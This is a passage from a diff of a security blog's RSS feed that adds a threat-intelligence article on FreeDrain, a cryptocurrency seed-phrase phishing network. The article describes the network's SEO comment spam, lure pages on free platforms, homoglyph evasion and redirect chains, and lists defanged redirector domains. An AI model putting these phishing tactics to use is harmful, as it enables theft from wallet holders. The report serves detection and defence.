@@ -12,7 +12,7 @@
 	<atom:link href="https://www.sentinelone.com/labs/feed/" rel="self" type="application/rss+xml" />
 	<link>https://www.sentinelone.com/labs/</link>
 	<description>Next Generation Endpoint Security</description>
-	<lastBuildDate>Sat, 26 Apr 2025 18:07:42 +0000</lastBuildDate>
+	<lastBuildDate>Wed, 07 May 2025 21:24:16 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,764 @@
 	1	</sy:updateFrequency>
 	
 	<item>
+		<title>FreeDrain Unmasked &#124; Uncovering an Industrial-Scale Crypto Theft Network</title>
+		<link>https://www.sentinelone.com/labs/freedrain-unmasked-uncovering-an-industrial-scale-crypto-theft-network/</link>
+		
+		<dc:creator><![CDATA[Tom Hegel, Kenneth Kinion (Validin) &amp; Sreekar Madabushi (Validin)]]></dc:creator>
+		<pubDate>Thu, 08 May 2025 13:55:29 +0000</pubDate>
+				<category><![CDATA[Crypto]]></category>
+		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=121002</guid>
+
+					<description><![CDATA[FreeDrain is a modern, scalable phishing operation exploiting weaknesses in free publishing platforms to steal cryptocurrency on a global scale.]]></description>
+										<content:encoded><![CDATA[<h2>Executive Summary</h2>
+<ul>
+<li aria-level="1">FreeDrain is an industrial-scale, global cryptocurrency phishing operation that has been stealing digital assets for years.</li>
+<li aria-level="1">FreeDrain uses SEO manipulation, free-tier web services (like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>), and layered redirection techniques to target cryptocurrency wallets.</li>
+<li aria-level="1">Victims search for wallet-related queries, click on high-ranking malicious results, land on lure pages, and are redirected to phishing pages that steal their seed phrases.</li>
+<li aria-level="1">SentinelLABS and Validin researchers identified over 38,000 distinct FreeDrain subdomains hosting lure pages.</li>
+<li aria-level="1">Phishing pages are hosted on cloud infrastructure like Amazon S3 and Azure Web Apps, mimicking legitimate cryptocurrency wallet interfaces.</li>
+<li aria-level="1">Evidence suggests the operators are based in the UTC+05:30 timezone (Indian Standard Time) and work standard weekday hours.</li>
+<li aria-level="1">FreeDrain represents a modern, scalable phishing operation that exploits weaknesses in free publishing platforms and requires better platform-level defenses, user education, and security community collaboration.</li>
+</ul>
+<p>Unveiled today at <a href="https://pivotcon.org/agenda-2025/" target="_blank" rel="noopener noreferrer">PIVOTcon</a>, this joint research from <a href="https://www.validin.com/blog/freedrain_unmasked/" target="_blank" rel="noopener noreferrer">Validin</a>, the global internet intelligence platform, and <a href="https://s1.ai/FreeDrain" target="_blank" rel="noopener noreferrer">SentinelLABS</a>, the threat intelligence and research team of SentinelOne, exposes the FreeDrain Network: a sprawling, industrial-scale cryptocurrency phishing operation that has quietly siphoned digital assets for years. What began as an investigation into a single phishing page quickly uncovered a vast, coordinated campaign weaponizing search engine optimization, free-tier web services, and layered redirection techniques to systematically target and drain cryptocurrency wallets at scale.</p>
+<p>In this collaborative blog, we detail the technical anatomy of the FreeDrain operation from the discovery process and infrastructure mapping to evasion techniques and the end-to-end workflow attackers use to funnel victims through multilayered financial theft paths. We also walk through the custom tooling we built to hunt, track, and monitor this large campaign in real time.</p>
+<p>Our findings highlight the growing sophistication of financially motivated threat actors and the systemic risks posed by under-moderated publishing platforms. This research underscores the need for adaptive detection, proactive monitoring, and tighter safeguards across the ecosystem to disrupt threats like FreeDrain before they scale.</p>
+<h2>The Plea for Help</h2>
+<p>Our investigation into what would become the <i>FreeDrain</i> Network began on May 12, 2024, when Validin received a message from a distressed individual who had lost approximately 8 BTC, worth around $500,000 at the time. The victim had unknowingly submitted their wallet seed phrase to a phishing site while attempting to check their wallet balance, after clicking on a highly-ranked search engine result.</p>
+<figure id="attachment_121004" aria-describedby="caption-attachment-121004" style="width: 1007px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg" alt="Request for help after successful phish" width="1007" height="333" class="size-full wp-image-121004" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg 1007w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-768x254.jpg 768w" sizes="(max-width: 1007px) 100vw, 1007px" /><figcaption id="caption-attachment-121004" class="wp-caption-text">Request for help after successful phish</figcaption></figure>
+<p>The individual had come across a Validin blog post from April 2024, <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">which documented a series of crypto-draining phishing pages</a>. The phishing site they encountered shared striking similarities to the infrastructure we had analyzed—specifically, pages hosted on <code>azurewebsites[.]net</code>, along with additional dedicated domain names.</p>
+<p>Trusted cryptocurrency tracking analysts confirmed that the destination wallet used to receive the victim’s funds was a one-time-use address. The stolen assets were quickly moved through a cryptocurrency mixer, an obfuscation method that fragments and launders funds across multiple transactions, making attribution and recovery nearly impossible.</p>
+<p>While we weren’t able to assist in recovering the lost assets, this outreach marked a turning point. It became clear that the incident was not isolated. We set out to uncover the infrastructure behind the scam and understand the broader operation enabling these thefts to occur at scale.</p>
+<h2>Cracking the Surface – Our First Look at FreeDrain</h2>
+<p>When Valdin published the <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">initial findings in April 2024</a>, one key piece of the puzzle remained unclear: how were these phishing pages reaching victims at scale? While common delivery methods like phishing emails, SMS (smishing), social media posts, and blog comment spam are frequently used in cryptocurrency scams, none appeared to be the source in this case.</p>
+<p>That changed with the report from the victim in May. They had encountered the phishing site via a top-ranked search engine result, not a suspicious message or unsolicited link.</p>
+<p>Curious whether we could reproduce the victim’s experience, we conducted a series of keyword searches ourselves. The results were startling.</p>
+<p>Search terms like &#8220;<i>Trezor wallet balance</i>&#8221; returned multiple malicious results across Google, Bing, and DuckDuckGo, often within the first few result pages.</p>
+<p><figure id="attachment_121024" aria-describedby="caption-attachment-121024" style="width: 1504px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg" alt="Trezor Wallet Balance malicious result in DuckDuckGo" width="1504" height="1131" class="size-full wp-image-121024" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg 1504w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-1024x770.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-768x578.jpg 768w" sizes="(max-width: 1504px) 100vw, 1504px" /><figcaption id="caption-attachment-121024" class="wp-caption-text">Trezor Wallet Balance malicious result in DuckDuckGo</figcaption></figure><br />
+<figure id="attachment_121010" aria-describedby="caption-attachment-121010" style="width: 1498px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg" alt="Trezor Wallet Balance malicious result in top Bing Search" width="1498" height="1130" class="size-full wp-image-121010" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg 1498w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-768x579.jpg 768w" sizes="(max-width: 1498px) 100vw, 1498px" /><figcaption id="caption-attachment-121010" class="wp-caption-text">Trezor Wallet Balance malicious result in top Bing Search</figcaption></figure><br />
+<figure id="attachment_121007" aria-describedby="caption-attachment-121007" style="width: 1142px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg" alt="Trezor Wallet Balance malicious result in Top Google Search result" width="1142" height="774" class="size-full wp-image-121007" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg 1142w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-300x203.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-1024x694.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-768x521.jpg 768w" sizes="auto, (max-width: 1142px) 100vw, 1142px" /><figcaption id="caption-attachment-121007" class="wp-caption-text">Trezor Wallet Balance malicious result in Top Google Search result</figcaption></figure></p>
+<p>These were not obscure or poorly maintained phishing sites; they were professionally crafted lure pages freely hosted on subdomains of trusted platforms like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>.</p>
+<p>This discovery marked our first real glimpse into the scale and sophistication of the FreeDrain campaign—and raised a host of new questions. Specifically, what is the overall workflow once a victim visits the site, how are these pages becoming so highly ranked, and what can we discover about the attackers themselves?</p>
+<h2>Workflow &#8211; A Victim’s Path to Compromise</h2>
+<p>To understand how victims were being funneled into this operation and the post-visit workflow, we checked out the top-ranked search results that we knew weren’t connected to authoritative, legitimate websites, looking for malicious behavior. Within minutes, we encountered related live phishing pages, and quickly began piecing together the end-to-end workflow that a typical victim might experience.</p>
+<p>The attack chain was deceptively simple:</p>
+<ol>
+<li aria-level="1"><b>Search for wallet-related queries</b> (e.g., &#8220;Trezor wallet balance&#8221;) on a major search engine.</li>
+<li aria-level="1"><b>Click a high-ranking result</b>, often hosted on a seemingly trustworthy platform like <code>gitbook.io</code> or <code>webflow.io</code>.</li>
+<li aria-level="1"><b>Land on a page displaying a large, clickable image</b>, a static screenshot of the legitimate wallet interface.</li>
+<li aria-level="1"><b>Click the image</b>, which either:
+<ul>
+<li aria-level="2">Redirects the user to legitimate websites.</li>
+<li aria-level="2">Redirects the user through one or more intermediary sites</li>
+<li aria-level="2">Directly leads to a phishing page.</li>
+</ul>
+</li>
+<li aria-level="1"><b>Arrive at the final phishing site</b>, a near-perfect clone of the real wallet service, prompting the user to input their seed phrase.</li>
+</ol>
+<figure id="attachment_121268" aria-describedby="caption-attachment-121268" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1.jpg" alt="Attack chain summary" width="1999" height="1215" class="size-full wp-image-121268" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-300x182.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-1024x622.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-768x467.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_supp1-1536x934.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121268" class="wp-caption-text">Attack chain summary</figcaption></figure>
+<p>The entire flow is frictionless by design, blending SEO manipulation, familiar visual elements, and platform trust to lull victims into a false sense of legitimacy. And once a seed phrase is submitted, the attacker’s automated infrastructure will drain funds within minutes.</p>
+<p><figure id="attachment_121009" aria-describedby="caption-attachment-121009" style="width: 1438px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4.jpg" alt="Lure page linking to phishing page" width="1438" height="1041" class="magnify size-full wp-image-121009" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4.jpg 1438w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-300x217.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-1024x741.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_4-768x556.jpg 768w" sizes="auto, (max-width: 1438px) 100vw, 1438px" /><figcaption id="caption-attachment-121009" class="wp-caption-text">Lure page linking to phishing page</figcaption></figure><br />
+<figure id="attachment_121015" aria-describedby="caption-attachment-121015" style="width: 1440px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21.jpg" alt="Redirect to legitimate site" width="1440" height="1041" class="magnify size-full wp-image-121015" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21.jpg 1440w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-300x217.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-1024x740.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_21-768x555.jpg 768w" sizes="auto, (max-width: 1440px) 100vw, 1440px" /><figcaption id="caption-attachment-121015" class="wp-caption-text">Redirect to legitimate site</figcaption></figure></p>
+<h2>Lure Page Ranking &#8211; Weaponizing SEO</h2>
+<p>We were stunned by the sheer volume of lure pages appearing among top-ranked search results across all major search engines. These weren’t complex, multi-layered scams. In most cases, the pages consisted of just a single large image (again, usually a screenshot of a legitimate crypto wallet interface) followed by a few lines of text that offered seemingly helpful instructions, ironically, some even claimed to educate users on how to avoid phishing.</p>
+<p>This type of simplistic, Q&amp;A-style content is well-known in SEO circles for being rewarded by search engine algorithms. Because users often turn to search engines for direct answers, pages that appear to offer guidance, even when malicious, can be algorithmically elevated in rankings, especially when hosted on high-reputation platforms.</p>
+<p>In our early investigation (May–June 2024), we found that many of these lure pages were hosted on services like <code>webflow.io</code> and <code>gitbook.io</code>. Both platforms provide low-friction publishing, enabling anyone to spin up a custom subdomain and publish arbitrary content for free. The subdomains used followed familiar spammer patterns, frequent use of hyphens, deliberate misspellings, and keyword stuffing to manufacture variation and dodge blacklisting.</p>
+<figure id="attachment_121012" aria-describedby="caption-attachment-121012" style="width: 717px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg" alt="Subdomain naming scheme similarities" width="717" height="426" class="size-full wp-image-121012" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg 717w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24-300x178.jpg 300w" sizes="auto, (max-width: 717px) 100vw, 717px" /><figcaption id="caption-attachment-121012" class="wp-caption-text">Subdomain naming scheme similarities</figcaption></figure>
+<h3>Generative AI as a Tool for Scale</h3>
+<p>The text on many lure pages bore clear signs of having been generated by large language models. We found copy-paste artifacts that revealed the specific tools used, most notably, strings like &#8220;4o mini&#8221;, a likely reference to OpenAI’s GPT-4o mini model. These telltale traces suggest that FreeDrain operators are leveraging generative AI not only to create scalable content but doing so carelessly at times.</p>
+<figure id="attachment_121027" aria-describedby="caption-attachment-121027" style="width: 1239px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg" alt="Fake content mistakenly including OpenAI GPT-4o mini reference" width="1239" height="775" class="size-full wp-image-121027" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg 1239w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-300x188.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-1024x641.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-768x480.jpg 768w" sizes="auto, (max-width: 1239px) 100vw, 1239px" /><figcaption id="caption-attachment-121027" class="wp-caption-text">Fake content mistakenly including OpenAI GPT-4o mini reference</figcaption></figure>
+<h3>FreeDrain’s Secret Weapon &#8211; Spamdexing</h3>
+<p>But content alone doesn&#8217;t explain how these pages were getting indexed and ranked above legitimate sources. How were search engines even discovering them?</p>
+<p>The answer came when we identified several indexed URLs pointing back to high-ranking lure pages, and traced them to massive comment spam campaigns. FreeDrain operators appear to be heavily abusing neglected web properties that allow open or weakly-moderated comments, flooding them with links pointing to their lure pages. This old tactic, known as <a href="https://blog.sucuri.net/2023/06/spamdexing-what-is-seo-spam.html" target="_blank" rel="noopener noreferrer">spamdexing</a>, is a well-documented SEO abuse technique, which FreeDrain makes heavy use of as <a href="https://www.sentinelone.com/blog/breaking-down-the-seo-poisoning-attack-how-attackers-are-hijacking-search-results/" target="_blank" rel="noopener noreferrer">one of the ways to</a> attempt to game SEO.</p>
+<p>In one striking example, we found a Korean university photo album page with a single image uploaded over a decade ago, buried under 26,000 comments, nearly all of them containing spam links.</p>
+<figure id="attachment_121026" aria-describedby="caption-attachment-121026" style="width: 1023px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg" alt="FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing" width="1023" height="776" class="size-full wp-image-121026" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg 1023w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-300x228.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-768x583.jpg 768w" sizes="auto, (max-width: 1023px) 100vw, 1023px" /><figcaption id="caption-attachment-121026" class="wp-caption-text">FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing</figcaption></figure>
+<p>This technique allows FreeDrain to sidestep traditional delivery vectors like phishing emails or malicious ads, instead meeting victims exactly where they’re looking, at the top of trusted search engines.</p>
+<h2>Tracking Search Results</h2>
+<p>Understanding how FreeDrain&#8217;s lure pages consistently climbed to the top of search results became a key investigative goal, and it demanded custom tooling.</p>
+<p>We built a purpose-specific crawler designed solely to emulate search engine queries, navigate through pages of search results, and extract structured data from each result: URLs, page titles, and text content summaries. The goal was to systematically monitor how malicious pages were ranking, shifting, and proliferating over time.</p>
+<p>We ran this system daily across 700 unique keyword permutations, capturing up to 40 pages deep per search query, per search engine. This daily monitoring provided a dynamic, longitudinal view into the visibility of FreeDrain’s infrastructure.</p>
+<h3>The Scale of Abuse</h3>
+<p>After four months of collection, we amassed a dataset of more than 200,000 unique URLs, drawn from topical search results across at least a dozen different publishing platforms that allow users to create custom subdomains. Aggressively filtering, we identified over 38,000 distinct FreeDrain subdomains hosting the lure pages.</p>
+<p>These subdomains appeared on well-known free hosting and publishing platforms, including:</p>
+<ul>
+<li aria-level="1">Gitbook (gitbook.io)</li>
+<li aria-level="1">Webflow (webflow.io)</li>
+<li aria-level="1">Teachable (teachable.com)</li>
+<li aria-level="1">Github.io</li>
+<li aria-level="1">Strikingly (mystrikingly.com)</li>
+<li aria-level="1">WordPress.com</li>
+<li aria-level="1">Weebly.com</li>
+<li aria-level="1">GoDaddySites (godaddysites.com)</li>
+<li aria-level="1">Educator Pages (educatorpages.com)</li>
+<li aria-level="1">Webador (webador.com)</li>
+</ul>
+<figure id="attachment_121019" aria-describedby="caption-attachment-121019" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg" alt="Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity" width="1999" height="1180" class="size-full wp-image-121019" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121019" class="wp-caption-text">Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity</figcaption></figure>
+<p>The volume and spread across legitimate platforms further highlights how FreeDrain relies on the low-friction, high-trust nature of these services to evade detection and amplify reach.</p>
+<p>To go beyond static discovery, we implemented scheduled re-crawls of every suspected lure page. This allowed us to track:</p>
+<ul>
+<li aria-level="1">Content updates over time</li>
+<li aria-level="1">Changes in redirect behavior</li>
+<li aria-level="1">New final-stage phishing URLs being introduced</li>
+<li aria-level="1">Takedowns and domain churn</li>
+</ul>
+<p>This gave us a clearer picture of FreeDrain&#8217;s infrastructure lifecycle, from initial lure page creation to eventual takedown or abandonment, which helped us understand the rotation strategies used to keep malicious links live and searchable.</p>
+<h2>Lure Page Breakdown</h2>
+<p>Despite being spread across a wide array of publishing platforms, FreeDrain lure pages followed a remarkably consistent structure, carefully optimized to appear helpful and legitimate, while subtly guiding victims toward compromise.</p>
+<h3>Common Elements Observed Across Lure Pages</h3>
+<p>Across <code>gitbook.io</code>, <code>webflow.io</code>, <code>github.io</code>, and others, the pages typically included:</p>
+<ul>
+<li aria-level="1">A single, large, clickable image occupying most of the viewport
+<ul>
+<li aria-level="2">This image was a screenshot of a legitimate cryptocurrency site (e.g., Trezor, Metamask, or Ledger)</li>
+<li aria-level="2">The image linked externally, usually to a malicious redirection chain</li>
+</ul>
+</li>
+<li aria-level="1">AI-generated help content positioned below the image
+<ul>
+<li aria-level="2">The text answered common user queries like <i>&#8220;How do I check my wallet balance on Trezor?&#8221;</i></li>
+</ul>
+</li>
+<li aria-level="1">1–2 additional embedded links, which pointed to the same external destination as the image or were placeholders like <code>"#"</code></li>
+</ul>
+<h3>Link Behavior: Redirection Variability</h3>
+<p>Clicking the image or associated links triggered unpredictable outcomes, depending on the time, user agent, or page freshness:</p>
+<ul>
+<li aria-level="1">Redirection through one or more intermediary domains (typically 1–5 hops)</li>
+<li aria-level="1">Final destinations varied widely:
+<ul>
+<li aria-level="2">A phishing page built to capture wallet seed phrases (hosted on Azure or AWS S3)</li>
+<li aria-level="2">A legitimate site like trezor.io or metamask.io, creating false reassurance</li>
+<li aria-level="2">A non-functional domain (404 or NXDOMAIN)</li>
+<li aria-level="2">The current page itself (<code>"#"</code>) acting as a placeholder when infrastructure wasn’t active</li>
+</ul>
+</li>
+</ul>
+<p>This redirection behavior made classification challenging, especially since not every page led directly to a phishing endpoint in every instance.We observed that lure pages initially hosted benign content before being modified to include malicious redirects usually weeks or months later. This aging tactic likely helped the sites build trust and survive longer before being flagged or removed.</p>
+<figure id="attachment_121028" aria-describedby="caption-attachment-121028" style="width: 1224px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg" alt="A Github lure page that has just been changed from benign to malicious" width="1224" height="793" class="size-full wp-image-121028" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg 1224w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-300x194.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-1024x663.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-768x498.jpg 768w" sizes="auto, (max-width: 1224px) 100vw, 1224px" /><figcaption id="caption-attachment-121028" class="wp-caption-text">A Github lure page that has just been changed from benign to malicious</figcaption></figure>
+<h3>Obfuscation Through Variation</h3>
+<p>Identifying FreeDrain lure pages at scale proved difficult due to extreme variation in phrasing, metadata, and platform-specific formatting. For example, we identified 46 unique renderings of the word &#8220;Trezor&#8221;, all visually similar, using tricks like added Unicode characters, zero-width spaces, and mixed script alphabets.</p>
+<p><figure id="attachment_121023" aria-describedby="caption-attachment-121023" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14.jpg" alt="Trezor variation heatmap by quantity" width="1999" height="1179" class="size-full wp-image-121023" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-1536x906.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121023" class="wp-caption-text">Trezor variation heatmap by quantity</figcaption></figure><br />
+Demonstrating the variations in tooling use, we found that FreeDrain pages on github\.io were usually copies of the generated content from services like Mobrise Website Builder and Webflow.</p>
+<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20.jpg" alt="" width="1194" height="170" class="aligncenter size-full wp-image-121016" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20.jpg 1194w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-300x43.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-1024x146.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-768x109.jpg 768w" sizes="auto, (max-width: 1194px) 100vw, 1194px" /><br />
+<figure id="attachment_121017" aria-describedby="caption-attachment-121017" style="width: 1203px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2.jpg" alt="Snippets of pages hosted on github\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”" width="1203" height="169" class="size-full wp-image-121017" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2.jpg 1203w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-300x42.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-1024x144.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-768x108.jpg 768w" sizes="auto, (max-width: 1203px) 100vw, 1203px" /><figcaption id="caption-attachment-121017" class="wp-caption-text">Snippets of pages hosted on github\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”</figcaption></figure></p>
+<p>A turning point in connecting these fragmented domains came from pivoting off the redirection infrastructure. While the lure content varied, the redirectors often remained consistent across pages and platforms.</p>
+<figure id="attachment_121005" aria-describedby="caption-attachment-121005" style="width: 1240px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8.jpg" alt="Validin result showing redirector abusing free services" width="1240" height="380" class="size-full wp-image-121005" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8.jpg 1240w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-300x92.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-1024x314.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-768x235.jpg 768w" sizes="auto, (max-width: 1240px) 100vw, 1240px" /><figcaption id="caption-attachment-121005" class="wp-caption-text">Validin result showing redirector abusing free services</figcaption></figure>
+<p>By tracing traffic from anchor links to known FreeDrain redirectors, we were able to map common ownership and activity across otherwise-unrelated services. This infrastructure-based pivot became essential for clustering and attribution, bridging gaps that the lure content itself couldn&#8217;t.</p>
+<h2>Redirectors</h2>
+<p>Pivoting on URLs from known and suspected FreeDrain lure pages that we were monitoring, we quickly noticed some noteworthy patterns in the FreeDrain redirection domains.</p>
+<h3>Domain Characteristics</h3>
+<p>Nearly all redirector domains shared several features:</p>
+<ul>
+<li aria-level="1">.com TLDs exclusively</li>
+<li aria-level="1">Names that appeared algorithmically generated, likely via a Domain Generation Algorithm (DGA) or Markov chain model</li>
+<li aria-level="1">English-adjacent structure, visually familiar but never forming real English words</li>
+</ul>
+<p>Examples include:</p>
+<ul>
+<li aria-level="1">antressmirestos[.]com</li>
+<li aria-level="1">shotheatsgnovel[.]com</li>
+<li aria-level="1">bildherrywation[.]com</li>
+</ul>
+<p>Each URL also included a GUID-like string in the path, which may have served as a session ID, traffic source identifier, or logic gate for redirection behavior. Examples:</p>
+<ul>
+<li aria-level="1">https://causesconighty[.]com/ce405b14-337a-43a5-9007-ed1aaf807998</li>
+<li aria-level="1">https://causesconighty[.]com/d7c95729-6eed-452a-b246-865e0d97fc23</li>
+<li aria-level="1">https://disantumcomptions[.]com/61e7fc9c-baef-43f0-82bf-a7f12a025586</li>
+<li aria-level="1">https://disantumcomptions[.]com/6c31ec3b-0d4b-4bf4-a9f4-91453c4ef99e</li>
+<li aria-level="1">https://distrypromited[.]com/d7c95729-6eed-452a-b246-865e0d97fc23</li>
+<li aria-level="1">https://distrypromited[.]com/ff933705-9619-4292-9e22-02269acc197b</li>
+<li aria-level="1">https://posectsinsive[.]com/9431711a-cf35-4ebd-b5db-eacba9ef7ee3</li>
+<li aria-level="1">https://posectsinsive[.]com/994ffe2a-21fb-448a-b4e3-01b9483c5460</li>
+</ul>
+<p>(A complete list of FreeDrain-associated redirector domains is provided in the appendix.)</p>
+<h3>Domain Registration and Infrastructure Clues</h3>
+<p>All domains we identified were registered via Key-Systems GmbH, a registrar often used for bulk domain purchases and programmatic registration.</p>
+<p>Initially, we suspected that these domains were all managed by the FreeDrain operators as well, but have since connected these domains to a much larger network of thousands domain names that are used to route traffic for many different purposes.</p>
+<p>Looking at DNS history for some of the older redirectors on our list, we saw that they rotated IP addresses relatively infrequently, resolving to just a small number of IPs within a time window of weeks to months.</p>
